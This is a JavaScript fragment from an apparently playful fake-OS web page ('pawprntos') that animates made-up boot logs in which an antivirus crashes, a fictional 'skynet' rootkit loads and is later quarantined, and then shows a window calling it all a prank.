    "[    0.049012] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.049234] pawguard[456]: initializing v3.2.1 (build 20260909)",
    "[    0.049456] pawguard[456]: loading virus definitions...",
    "[    0.049678] pawguard[456]: 987654 signatures loaded",
    "[    0.049890] pawguard[456]: starting real-time file monitor...",
    "[    0.050123] pawguard[456]: watching /home, /etc, /var, /tmp",
    "[    0.050345] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.050567] pawguard[456]: scanning /home/skynet/pwned...",
    "[    0.050789] pawguard[456]:   !! SCANNING !!",
    "[    0.051012] pawguard[456]:   !! MALWARE SIGNATURE DETECTED !!",
    "[    0.051234] pawguard[456]:   !! QUARANTINE FAILED: PERMISSION DENIED !!",
    "[    0.051456] kernel: [  51.234567] pawguard[456]: segfault at 42069 ip 00007f1234abcdef sp 00007ffcaabbccdd error 6",
    "[    0.051678] kernel: [  51.234890] pawguard[456]: killed by signal 11 (SIGSEGV)",
    "[    0.051890] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.052123] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.052345] systemd[1]: pawguard.service: Scheduled restart job, restart counter is 2.",
    "[    0.052567] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.052789] pawguard[678]: initializing v3.2.1 (build 20260909)",
    "[    0.053012] pawguard[678]: loading virus definitions...",
    "[    0.053234] pawguard[678]: 987654 signatures loaded",
    "[    0.053456] pawguard[678]: scanning /home/skynet/pwned...",
    "[    0.053678] pawguard[678]:   !! QUARANTINE FAILED: FILE LOCKED BY ROOT !!",
    "[    0.053890] kernel: [  62.345678] pawguard[678]: segfault at 42069",
    "[    0.054123] kernel: [  62.345890] pawguard[678]: killed by signal 11 (SIGSEGV)",
    "[    0.054345] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.054567] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.054789] systemd[1]: pawguard.service: Start request repeated too quickly, refusing to start.",
    "[    0.055012] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.055234] systemd[1]: pawguard.service: Triggering ejection from memory.",
    "[    0.055456] systemd[1]: Stopping pawguard Antivirus Service...",
    "[    0.055678] systemd[1]: pawguard.service: Service entered failed state.",
    "[    0.055890] systemd[1]: pawguard.service: Service will not restart (Restart=on-failure limit reached).",
    "[    0.056123] kernel: [  68.901234] skynet: loaded module, version 4.2.0",
    "[    0.056345] kernel: [  68.901567] skynet: hooking syscalls...",
    "[    0.056567] kernel: [  68.901890] skynet: syscall table hooked at 0xffffffff81a00000",
    "[    0.056789] kernel: [  68.902123] skynet: rootkit active, hiding from ps/ls",
    "[    0.057012] systemd[1]: Starting Emergency Filesystem Check...",
    "[    0.057234] systemd[1]: Starting Emergency Recovery...",
    "[    0.057456] systemd[1]: emergency.target: Starting emergency shell...",
    "[    0.057678] systemd[1]: emergency.target: Reached.",
    "[    0.057890] kernel: [  72.123456] emergency: system compromised, initiating lockdown",
    "[    0.058123] kernel: [  72.123789] lockdown: integrity: enforcing confidentiality",
    "[    0.058345] kernel: [  72.124012] lockdown: integrity: activating integrity mode",
    "[    0.058567] kernel: [  72.124234] lockdown: confidentiality: enabling lockdown mode",
    "[    0.058789] kernel: [  72.124456] lockdown: confidentiality: all memory mappings restricted",
    "[    0.059012] systemd[1]: Stopping all services...",
    "[    0.059234] systemd[1]: Stopping MariaDB Database Server...",
    "[    0.059456] systemd[1]: Stopping CUPS Scheduler...",
    "[    0.059678] systemd[1]: Stopping Bluetooth service...",
    "[    0.059890] systemd[1]: Stopping OpenSSH server daemon...",
    "[    0.060123] systemd[1]: Stopping Network Manager...",
    "[    0.060345] systemd[1]: Stopping D-Bus System Message Bus...",
    "[    0.060567] systemd[1]: Stopping Journal Service...",
    "[    0.060789] systemd[1]: emergency.target: Triggering shutdown.",
    "[    0.061012] systemd[1]: Shutting down...",
    "[    0.061234] systemd[1]: Unmounting /home...",
    "[    0.061456] systemd[1]: Unmounting /var...",
    "[    0.061678] systemd[1]: Unmounting /tmp...",
    "[    0.061890] systemd[1]: Unmounting swap...",
    "[    0.062123] systemd[1]: Deactivating swap...",
    "[    0.062345] systemd[1]: Reached target Unmount All Filesystems.",
    "[    0.062567] systemd[1]: Reached target Shutdown.",
    "[    0.062789] systemd[1]: Reached target Final Step.",
    "[    0.063012] systemd[1]: Starting halt machine...",
    "[    0.063234] systemd[1]: Starting power off machine...",
    "[    0.063456] systemd[1]: Starting reboot machine...",
    "[    0.063678] systemd[1]: System halted.",
  ];

  var phase2 = [
    "",
    "[    0.000000] Linux version 6.8.0-pawprntos (gcc 13.2.1) #1 SMP PREEMPT_DYNAMIC",
    "[    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000000] BIOS-provided physical RAM map:",
    "[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable",
    "[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable",
    "[    0.000000] NX (Execute Disable) protection: active",
    "[    0.000000] tsc: Fast TSC calibration using PMI",
    "[    0.000000] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved",
    "[    0.000000] last_pfn = 0x40000 max_arch_pfn = 0x400000000",
    "[    0.000000] MTRR default type: write-back",
    "[    0.000000] Using GB direct pages",
    "[    0.000000] ACPI: RSDP 0x00000000000F0490 000024 (v02 PAW   )",
    "[    0.000000] ACPI: RSDT 0x000000003FFF0000 000034 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: Local APIC address 0xfee00000",
    "[    0.000004] Initializing cgroup subsys cpuset",
    "[    0.000005] Linux version 6.8.0-pawprntos (paw@nyaa) (gcc 13.2.1) #1",
    "[    0.000006] random: crng init done",
    "[    0.000007] Memory: 16384MB available",
    "[    0.000008] CPU: 8 core(s) detected",
    "[    0.000234] Dentry cache hash table entries: 2097152 (order: 8)",
    "[    0.000456] Inode-cache hash table entries: 1048576 (order: 7)",
    "[    0.001234] CPU: Physical Node 0  Core/Thread 0/0",
    "[    0.001235] CPU: Physical Node 0  Core/Thread 1/1",
    "[    0.001236] CPU: Physical Node 0  Core/Thread 2/2",
    "[    0.001237] CPU: Physical Node 0  Core/Thread 3/3",
    "[    0.001238] CPU: Physical Node 0  Core/Thread 4/4",
    "[    0.001239] CPU: Physical Node 0  Core/Thread 5/5",
    "[    0.001240] CPU: Physical Node 0  Core/Thread 6/6",
    "[    0.001241] CPU: Physical Node 0  Core/Thread 7/7",
    "[    0.001567] x86/mm: Pat enabled with type WB",
    "[    0.001789] Working set: ~1048576 pages, ~4096MB",
    "[    0.002012] Bringing up CPUs...",
    "[    0.002345] smpboot: Booting Node 0, Processors #1 #2 #3 #4 #5 #6 #7",
    "[    0.003456] Brought up 8 CPUs",
    "[    0.003789] devtmpfs: initialized",
    "[    0.004012] PM: Registering ACPI device...",
    "[    0.004234] ACPI: button: Power Button [PWRB]",
    "[    0.005012] clocksource: Switched to clocksource hpet",
    "[    0.005345] VFS: Disk quotas d6.6.0, version 6.5.0",
    "[    0.005678] pnp: PnP ACPI init",
    "[    0.005890] pnp: PnP ACPI: found 14 devices",
    "[    0.006123] EXT4-fs (sda1): mounting filesystem",
    "[    0.006345] EXT4-fs (sda1): mounted filesystem with ordered data mode",
    "[    0.006567] VFS: Mounted root (ext4 filesystem) readonly on device 8:1.",
    "[    0.006789] Run /sbin/init as init process",
    "[    0.007012] systemd[1]: systemd v255 running in system mode",
    "[    0.007234] systemd[1]: Detected architecture x86-64.",
    "[    0.007456] systemd[1]: Hostname set to <pawprntos>.",
    "[    0.007678] systemd[1]: Started Journal Service.",
    "[    0.007890] systemd[1]: Starting udev Kernel Device Manager...",
    "[    0.008123] systemd[1]: Starting Network Manager...",
    "[    0.008345] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.008567] systemd[1]: Starting pawprntos Display Manager...",
    "[    0.008789] systemd[1]: Starting OpenSSH server daemon...",
    "[    0.009012] systemd[1]: Starting Bluetooth service...",
    "[    0.009234] systemd[1]: Starting MariaDB Database Server...",
    "[    0.009456] systemd[1]: Started Network Manager.",
    "[    0.009678] systemd[1]: Started OpenSSH server daemon.",
    "[    0.009890] systemd[1]: Started Bluetooth service.",
    "[    0.010123] systemd[1]: Started MariaDB Database Server.",
    "[    0.010345] systemd[1]: Started pawguard Antivirus Service.",
    "[    0.010567] systemd[1]: Started pawprntos Display Manager.",
    "[    0.010789] pawguard[1024]: initializing v3.2.1 (build 20260909)",
    "[    0.011012] pawguard[1024]: loading virus definitions...",
    "[    0.011234] pawguard[1024]: 987654 signatures loaded",
    "[    0.011456] pawguard[1024]: starting real-time file monitor...",
    "[    0.011678] pawguard[1024]: watching /home, /etc, /var, /tmp",
    "[    0.011890] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.012123] systemd[1]: Starting Full System Scan...",
    "[    0.012345] pawguard[1056]: initiating boot-time scan...",
    "[    0.012567] pawguard[1056]: scanning /home/skynet/...",
    "[    0.012789] pawguard[1056]: scanning /home/skynet/pwned...",
    "[    0.013012] pawguard[1056]:   !! SCANNING !!",
    "[    0.013234] pawguard[1056]:   !! MALWARE SIGNATURE DETECTED !!",
    "[    0.013456] pawguard[1056]:   !! SIGNATURE: skynet.trojan.42069 !!",
    "[    0.013678] pawguard[1056]:   !! ATTEMPTING TO QUARANTINE...",
    "[    0.013890] pawguard[1056]:   !! QUARANTINE FAILED: PERMISSION DENIED !!",
    "[    0.014123] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.014345] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.014567] systemd[1]: pawguard.service: Scheduled restart job, restart counter is 1.",
    "[    0.014789] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.015012] pawguard[1100]: scanning /home/skynet/pwned...",
    "[    0.015234] pawguard[1100]:   !! QUARANTINE FAILED: FILE LOCKED BY ROOT !!",
    "[    0.015456] kernel: [  51.234567] pawguard[1100]: segfault at 42069",
    "[    0.015678] kernel: [  51.234890] pawguard[1100]: killed by signal 11 (SIGSEGV)",
    "[    0.015890] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.016123] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.016345] systemd[1]: pawguard.service: Start request repeated too quickly, refusing to start.",
    "[    0.016567] systemd[1]: pawguard.service: Service will not restart.",
    "[    0.016789] systemd[1]: Stopping pawguard Antivirus Service...",
    "[    0.017012] kernel: [  68.901234] skynet: loaded module, version 4.2.0",
    "[    0.017234] kernel: [  68.901567] skynet: hooking syscalls...",
    "[    0.017456] kernel: [  68.901890] skynet: rootkit active, hiding from ps/ls",
    "[    0.017678] systemd[1]: Starting Emergency Filesystem Check...",
    "[    0.017890] systemd[1]: Starting Emergency Recovery...",
    "[    0.018123] systemd[1]: emergency.target: Reached.",
    "[    0.018345] kernel: [  72.123456] emergency: system compromised, initiating lockdown",
    "[    0.018567] kernel: [  72.123789] lockdown: integrity: enforcing confidentiality",
    "[    0.018789] kernel: [  72.124012] lockdown: confidentiality: all memory mappings restricted",
    "[    0.019012] systemd[1]: Stopping all services...",
    "[    0.019234] systemd[1]: Stopping MariaDB Database Server...",
    "[    0.019456] systemd[1]: Stopping CUPS Scheduler...",
    "[    0.019678] systemd[1]: Stopping Bluetooth service...",
    "[    0.019890] systemd[1]: Stopping OpenSSH server daemon...",
    "[    0.020123] systemd[1]: Stopping Network Manager...",
    "[    0.020345] systemd[1]: Stopping D-Bus System Message Bus...",
    "[    0.020567] systemd[1]: Stopping Journal Service...",
    "[    0.020789] systemd[1]: Unmounting /home...",
    "[    0.021012] systemd[1]: Unmounting /var...",
    "[    0.021234] systemd[1]: Unmounting /tmp...",
    "[    0.021456] systemd[1]: Deactivating swap...",
    "[    0.021678] systemd[1]: System halted.",
  ];

  var bootLines = [
    "[    0.000000] Linux version 6.8.0-pawprntos (gcc 13.2.1) #1 SMP PREEMPT_DYNAMIC",
    "[    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000000] BIOS-provided physical RAM map:",
    "[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable",
    "[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable",
    "[    0.000000] NX (Execute Disable) protection: active",
    "[    0.000000] tsc: Fast TSC calibration using PMI",
    "[    0.000000] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved",
    "[    0.000000] last_pfn = 0x40000 max_arch_pfn = 0x400000000",
    "[    0.000000] MTRR default type: write-back",
    "[    0.000000] Using GB direct pages",
    "[    0.000000] ACPI: RSDP 0x00000000000F0490 000024 (v02 PAW   )",
    "[    0.000000] ACPI: RSDT 0x000000003FFF0000 000034 (v01 PAW   PAWPRNT  00000001)",
    "[    0.000000] ACPI: Local APIC address 0xfee00000",
    "[    0.000004] Initializing cgroup subsys cpuset",
    "[    0.000005] Linux version 6.8.0-pawprntos (paw@nyaa) (gcc 13.2.1) #1",
    "[    0.000006] random: crng init done",
    "[    0.000007] Memory: 16384MB available",
    "[    0.000008] CPU: 8 core(s) detected",
    "[    0.000234] Dentry cache hash table entries: 2097152 (order: 8)",
    "[    0.000456] Inode-cache hash table entries: 1048576 (order: 7)",
    "[    0.001234] CPU: Physical Node 0  Core/Thread 0/0",
    "[    0.001235] CPU: Physical Node 0  Core/Thread 1/1",
    "[    0.001236] CPU: Physical Node 0  Core/Thread 2/2",
    "[    0.001237] CPU: Physical Node 0  Core/Thread 3/3",
    "[    0.001238] CPU: Physical Node 0  Core/Thread 4/4",
    "[    0.001239] CPU: Physical Node 0  Core/Thread 5/5",
    "[    0.001240] CPU: Physical Node 0  Core/Thread 6/6",
    "[    0.001241] CPU: Physical Node 0  Core/Thread 7/7",
    "[    0.001567] x86/mm: Pat enabled with type WB",
    "[    0.001789] Working set: ~1048576 pages, ~4096MB",
    "[    0.002012] Bringing up CPUs...",
    "[    0.002345] smpboot: Booting Node 0, Processors #1 #2 #3 #4 #5 #6 #7",
    "[    0.003456] Brought up 8 CPUs",
    "[    0.003789] devtmpfs: initialized",
    "[    0.004012] PM: Registering ACPI device...",
    "[    0.004234] ACPI: button: Power Button [PWRB]",
    "[    0.005012] clocksource: Switched to clocksource hpet",
    "[    0.005345] VFS: Disk quotas d6.6.0, version 6.5.0",
    "[    0.005678] pnp: PnP ACPI init",
    "[    0.005890] pnp: PnP ACPI: found 14 devices",
    "[    0.006123] EXT4-fs (sda1): mounting filesystem",
    "[    0.006345] EXT4-fs (sda1): mounted filesystem with ordered data mode",
    "[    0.006567] VFS: Mounted root (ext4 filesystem) readonly on device 8:1.",
    "[    0.006789] Run /sbin/init as init process",
    "[    0.007012] systemd[1]: systemd v255 running in system mode",
    "[    0.007234] systemd[1]: Detected architecture x86-64.",
    "[    0.007456] systemd[1]: Hostname set to <pawprntos>.",
    "[    0.007678] systemd[1]: Started Journal Service.",
    "[    0.007890] systemd[1]: Starting udev Kernel Device Manager...",
    "[    0.008123] systemd[1]: Starting Network Manager...",
    "[    0.008345] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.008567] systemd[1]: Starting pawprntos Display Manager...",
    "[    0.008789] systemd[1]: Starting OpenSSH server daemon...",
    "[    0.009012] systemd[1]: Starting Bluetooth service...",
    "[    0.009234] systemd[1]: Starting MariaDB Database Server...",
    "[    0.009456] systemd[1]: Started Network Manager.",
    "[    0.009678] systemd[1]: Started OpenSSH server daemon.",
    "[    0.009890] systemd[1]: Started Bluetooth service.",
    "[    0.010123] systemd[1]: Started MariaDB Database Server.",
    "[    0.010345] systemd[1]: Started pawguard Antivirus Service.",
    "[    0.010567] systemd[1]: Started pawprntos Display Manager.",
    "[    0.010789] pawguard[1024]: initializing v3.2.1 (build 20260909)",
    "[    0.011012] pawguard[1024]: loading virus definitions...",
    "[    0.011234] pawguard[1024]: 987654 signatures loaded",
    "[    0.011456] pawguard[1024]: starting real-time file monitor...",
    "[    0.011678] pawguard[1024]: watching /home, /etc, /var, /tmp",
    "[    0.011890] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.012123] systemd[1]: Starting Full System Scan...",
    "[    0.012345] pawguard[1056]: initiating boot-time scan...",
    "[    0.012567] pawguard[1056]: scanning /home/skynet/pwned...",
    "[    0.012789] pawguard[1056]:   !! SCANNING !!",
    "[    0.013012] pawguard[1056]:   !! MALWARE SIGNATURE DETECTED !!",
    "[    0.013234] pawguard[1056]:   !! SIGNATURE: skynet.trojan.42069 !!",
    "[    0.013456] pawguard[1056]:   !! ATTEMPTING TO QUARANTINE...",
    "[    0.013678] pawguard[1056]:   !! QUARANTINE FAILED: PERMISSION DENIED !!",
    "[    0.013890] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.014123] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.014345] systemd[1]: pawguard.service: Scheduled restart job, restart counter is 1.",
    "[    0.014567] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.014789] pawguard[1100]: scanning /home/skynet/pwned...",
    "[    0.015012] pawguard[1100]:   !! QUARANTINE FAILED: FILE LOCKED BY ROOT !!",
    "[    0.015234] kernel: [  51.234567] pawguard[1100]: segfault at 42069",
    "[    0.015456] kernel: [  51.234890] pawguard[1100]: killed by signal 11 (SIGSEGV)",
    "[    0.015678] systemd[1]: pawguard.service: Main process exited, code=killed, status=11/SEGV",
    "[    0.015890] systemd[1]: pawguard.service: Failed with result 'signal'.",
    "[    0.016123] systemd[1]: pawguard.service: Start request repeated too quickly, refusing to start.",
    "[    0.016345] systemd[1]: pawguard.service: Service will not restart.",
    "[    0.016567] systemd[1]: Stopping pawguard Antivirus Service...",
    "[    0.016789] kernel: [  68.901234] skynet: loaded module, version 4.2.0",
    "[    0.017012] kernel: [  68.901567] skynet: hooking syscalls...",
    "[    0.017234] kernel: [  68.901890] skynet: rootkit active, hiding from ps/ls",
    "[    0.017456] systemd[1]: Starting Emergency Filesystem Check...",
    "[    0.017678] systemd[1]: Starting Emergency Recovery...",
    "[    0.017890] systemd[1]: emergency.target: Reached.",
    "[    0.018123] kernel: [  72.123456] emergency: system compromised, initiating lockdown",
    "[    0.018345] kernel: [  72.123789] lockdown: integrity: enforcing confidentiality",
    "[    0.018567] kernel: [  72.124012] lockdown: confidentiality: all memory mappings restricted",
    "[    0.018789] systemd[1]: Stopping all services...",
    "[    0.019012] systemd[1]: Stopping MariaDB Database Server...",
    "[    0.019234] systemd[1]: Stopping CUPS Scheduler...",
    "[    0.019456] systemd[1]: Stopping Bluetooth service...",
    "[    0.019678] systemd[1]: Stopping OpenSSH server daemon...",
    "[    0.019890] systemd[1]: Stopping Network Manager...",
    "[    0.020123] systemd[1]: Stopping D-Bus System Message Bus...",
    "[    0.020345] systemd[1]: Stopping Journal Service...",
    "[    0.020567] systemd[1]: Unmounting /home...",
    "[    0.020789] systemd[1]: Unmounting /var...",
    "[    0.021012] systemd[1]: Unmounting /tmp...",
    "[    0.021234] systemd[1]: Deactivating swap...",
    "[    0.021456] systemd[1]: System halted.",
    "",
    "pawprntos boot (attempt 2)",
    "[    0.000000] Linux version 6.8.0-pawprntos (gcc 13.2.1) #1 SMP PREEMPT_DYNAMIC",
    "[    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro quiet",
    "[    0.000000] BIOS-provided physical RAM map:",
    "[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable",
    "[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable",
    "[    0.000000] NX (Execute Disable) protection: active",
    "[    0.000000] random: crng init done",
    "[    0.000001] Memory: 16384MB available",
    "[    0.000002] CPU: 8 core(s) detected",
    "[    0.000234] Dentry cache hash table entries: 2097152 (order: 8)",
    "[    0.000456] Inode-cache hash table entries: 1048576 (order: 7)",
    "[    0.001012] Bringing up CPUs...",
    "[    0.001234] Brought up 8 CPUs",
    "[    0.001456] devtmpfs: initialized",
    "[    0.001678] clocksource: Switched to clocksource hpet",
    "[    0.001890] pnp: PnP ACPI init",
    "[    0.002012] pnp: PnP ACPI: found 14 devices",
    "[    0.002234] EXT4-fs (sda1): mounting filesystem",
    "[    0.002456] EXT4-fs (sda1): mounted filesystem with ordered data mode",
    "[    0.002678] VFS: Mounted root (ext4 filesystem) readonly on device 8:1.",
    "[    0.002890] Run /sbin/init as init process",
    "[    0.003012] systemd[1]: systemd v255 running in system mode",
    "[    0.003234] systemd[1]: Detected architecture x86-64.",
    "[    0.003456] systemd[1]: Hostname set to <pawprntos>.",
    "[    0.003678] systemd[1]: Started Journal Service.",
    "[    0.003890] systemd[1]: Starting udev Kernel Device Manager...",
    "[    0.004012] systemd[1]: Starting Network Manager...",
    "[    0.004234] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.004456] systemd[1]: Starting pawprntos Display Manager...",
    "[    0.004678] systemd[1]: Starting OpenSSH server daemon...",
    "[    0.004890] systemd[1]: Starting Bluetooth service...",
    "[    0.005012] systemd[1]: Started Network Manager.",
    "[    0.005234] systemd[1]: Started OpenSSH server daemon.",
    "[    0.005456] systemd[1]: Started Bluetooth service.",
    "[    0.005678] systemd[1]: Started pawguard Antivirus Service.",
    "[    0.005890] systemd[1]: Started pawprntos Display Manager.",
    "[    0.006012] pawguard[2048]: initializing v3.2.1 (build 20260909)",
    "[    0.006234] pawguard[2048]: loading virus definitions...",
    "[    0.006456] pawguard[2048]: 987654 signatures loaded",
    "[    0.006678] pawguard[2048]: starting real-time file monitor...",
    "[    0.006890] pawguard[2048]: watching /home, /etc, /var, /tmp",
    "[    0.007012] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.007234] systemd[1]: Starting Full System Scan...",
    "[    0.007456] pawguard[2080]: initiating boot-time scan...",
    "[    0.007678] pawguard[2080]: scanning /home/skynet/pwned...",
    "[    0.007890] pawguard[2080]:   !! SCANNING !!",
    "[    0.008123] pawguard[2080]:   !! MALWARE SIGNATURE DETECTED !!",
    "[    0.008345] pawguard[2080]:   !! ATTEMPTING TO QUARANTINE...",
    "[    0.008567] pawguard[2080]:   !! QUARANTINE SUCCESSFUL !!",
    "[    0.008789] pawguard[2080]:   /home/skynet/pwned -> /var/quarantine/pwned.20260909",
    "[    0.009012] pawguard[2080]:   malware contained",
    "[    0.009234] pawguard[2080]: scanning complete: 1,337,420 files scanned, 1 threat removed",
    "[    0.009456] systemd[1]: Starting pawguard Antivirus Service...",
    "[    0.009678] pawguard[2100]: initializing v3.2.1 (build 20260909)",
    "[    0.009890] pawguard[2100]: loading virus definitions...",
    "[    0.010123] pawguard[2100]: 987654 signatures loaded",
    "[    0.010345] pawguard[2100]: starting real-time file monitor...",
    "[    0.010567] pawguard[2100]: watching /home, /etc, /var, /tmp",
    "[    0.010789] systemd[1]: Started pawguard real-time protection daemon.",
    "[    0.011012] systemd[1]: Starting Full System Scan...",
    "[    0.011234] pawguard[2128]: initiating boot-time scan...",
    "[    0.011456] pawguard[2128]: scanning /home/skynet/...",
    "[    0.011678] pawguard[2128]:   .bashrc ........... clean",
    "[    0.011890] pawguard[2128]:   .ssh/ ............. clean",
    "[    0.012012] pawguard[2128]:   .bash_history ..... clean",
    "[    0.012234] pawguard[2128]:   DO_NOT_OPEN ....... clean",
    "[    0.012456] pawguard[2128]: scanning /home/skynet/pwned...",
    "[    0.012678] pawguard[2128]:   quarantined ...... clean",
    "[    0.012890] pawguard[2128]: scanning complete: 0 threats found",
    "[    0.013012] systemd[1]: pawguard.service: Main process exited, code=exited, status=0/SUCCESS",
    "[    0.013234] systemd[1]: pawguard.service: Succeeded.",
    "[    0.013456] systemd[1]: Startup finished in 2.345s (kernel) + 8.901s (initrd) + 13.456s (userspace) = 24.702s.",
  ];

  var lineIdx = 0;
  var phase = 1;

  function addLine(text, color) {
    var div = document.createElement("div");
    div.textContent = text;
    if (color) div.style.color = color;
    log.appendChild(div);
    log.scrollTop = log.scrollHeight;
  }

  function nextPhase1Line() {
    if (lineIdx < phase1.length) {
      var text = phase1[lineIdx];
      if (text.indexOf("!!") !== -1 || text.indexOf("segfault") !== -1) {
        addLine(text, "#ff4444");
        if (text.indexOf("!!") !== -1) playGlitchSfx("warning");
      } else if (text.indexOf("killed by signal") !== -1) {
        addLine(text, "#ff8800");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextPhase1Line, 30 + Math.random() * 70);
    } else {
      lineIdx = 0;
      phase = 2;
      setTimeout(nextPhase2Line, 800);
    }
  }

  function nextPhase2Line() {
    if (lineIdx < phase2.length) {
      var text = phase2[lineIdx];
      if (text.indexOf("!!") !== -1) {
        addLine(text, "#ff4444");
        if (text.indexOf("!!") !== -1) playGlitchSfx("warning");
      } else if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("threats removed") !== -1) {
        addLine(text, "#44ff44");
        playGlitchSfx("access");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextPhase2Line, 30 + Math.random() * 70);
    } else {
      lineIdx = 0;
      phase = 3;
      setTimeout(nextBootLine, 800);
    }
  }

  function nextBootLine() {
    if (lineIdx < bootLines.length) {
      var text = bootLines[lineIdx];
      if (text.indexOf("!!") !== -1) {
        addLine(text, "#ff4444");
      } else if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("threats removed") !== -1 || text.indexOf("Succeeded") !== -1 || text.indexOf("Startup finished") !== -1) {
        addLine(text, "#44ff44");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextBootLine, 20 + Math.random() * 50);
    } else {
      setTimeout(function() {
        boot.hidden = true;
        desktop.hidden = false;
        boot.style.background = "";
        boot.innerHTML = '<div class="boot-logo">pawprntos<span class="cursor">&#9612;</span></div><div class="boot-bar"><div class="boot-fill"></div></div><div class="boot-log"></div>';
        renderDesktop();
        setTimeout(function() {
          playGlitchSfx("access");
          var w = WM.makeWin({
            title: ":3",
            width: 400,
            height: 200,
          });
          w.bodyEl.style.cssText = "display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:1.1rem; text-align:center; padding:20px; line-height:1.6;";
          w.bodyEl.textContent = "all was a prank, your info is fine. have a good day! :3";
        }, 600);
      }, 800);
    }
  }

  nextPhase1Line();
}
